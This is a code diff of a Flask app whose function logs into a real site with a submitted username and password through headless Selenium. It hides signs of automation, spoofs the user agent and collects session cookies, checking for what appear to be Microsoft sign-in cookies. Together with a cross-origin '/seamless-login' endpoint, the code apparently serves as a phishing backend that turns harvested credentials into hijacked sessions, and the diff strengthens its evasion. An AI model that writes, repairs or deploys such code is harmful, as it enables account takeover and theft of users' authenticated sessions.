@@ -15,7 +15,7 @@ from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.common.exceptions import TimeoutException
-import chromedriver_binary  # CRITICAL: Add this import!
+
 
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
@@ -116,9 +116,8 @@ COOKIES ({len(cookies_dict)} total):
         })
 
 # ====================== SELENIUM LOGIN FOR RAILWAY ======================
-# ====================== SELENIUM LOGIN FOR RAILWAY ======================
 def login_to_real_site(username: str, password: str):
-    """Railway-optimized login with chromedriver-binary"""
+    """Railway-optimized login - uses system ChromeDriver"""
     driver = None
     try:
         options = Options()
@@ -129,25 +128,21 @@ def login_to_real_site(username: str, password: str):
         options.add_argument('--disable-blink-features=AutomationControlled')
         options.add_argument('--window-size=1920,1080')
         options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
+        options.add_argument('--disable-browser-side-navigation')
         options.add_experimental_option("excludeSwitches", ["enable-automation"])
         options.add_experimental_option('useAutomationExtension', False)
-
-        # CRITICAL: Use chromedriver-binary path, NOT /usr/local/bin/
-        import chromedriver_binary
-        import os
         
-        chromedriver_path = os.path.join(os.path.dirname(chromedriver_binary.__file__), 'chromedriver')
+        # RAILWAY: Use system Chrome
+        options.binary_location = '/usr/bin/google-chrome'
         
-        if os.path.exists(chromedriver_path):
-            os.chmod(chromedriver_path, 0o755)
-            print(f"✅ Chromedriver path: {chromedriver_path}")
-        else:
-            print(f"❌ Chromedriver not found at: {chromedriver_path}")
-            return {"cookies": {}, "success": False}
+        # RAILWAY: Use system ChromeDriver
+        service = Service('/usr/local/bin/chromedriver')
         
-        service = Service(executable_path=chromedriver_path)
         driver = webdriver.Chrome(service=service, options=options)
         driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined});")
+        driver.execute_cdp_cmd('Network.setUserAgentOverride', {
+            "userAgent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+        })
 
         print(f"🌐 Logging in as: {username}")
         
@@ -182,36 +177,27 @@ def login_to_real_site(username: str, password: str):
         except:
             print("ℹ️ No 'Stay signed in' prompt")
         
-        # STEP 5: Get cookies AFTER successful login
+        # STEP 5: Wait for redirect and get cookies
         time.sleep(3)
         cookies = {c['name']: c['value'] for c in driver.get_cookies()}
         
-        # STEP 6: Verify we have REAL authentication cookies
+        # STEP 6: Verify authentication cookies
         auth_cookies = [c for c in cookies.keys() 
                        if any(x in c.lower() for x in ['esctx', 'fpc', 'buid', 'msal'])]
         
         if auth_cookies:
             print(f"✅ Login successful! Auth cookies: {auth_cookies}")
-            print(f"📊 Total cookies: {len(cookies)}")
             return {"cookies": cookies, "success": True}
         else:
-            print("❌ No authentication cookies found - login failed")
-            driver.save_screenshot('login_failed.png')
-            print(f"📍 Current URL: {driver.current_url}")
+            print("❌ No authentication cookies found")
             return {"cookies": {}, "success": False}
             
-    except TimeoutException as e:
-        print(f"⏱️ Timeout during login: {e}")
-        return {"cookies": {}, "success": False}
     except Exception as e:
         print(f"❌ Login error: {e}")
         return {"cookies": {}, "success": False}
     finally:
         if driver:
-            try:
-                driver.quit()
-            except:
-                pass
+            driver.quit()
 
 # ====================== FLASK ROUTE ======================
 @app.route('/seamless-login', methods=['POST', 'OPTIONS'])
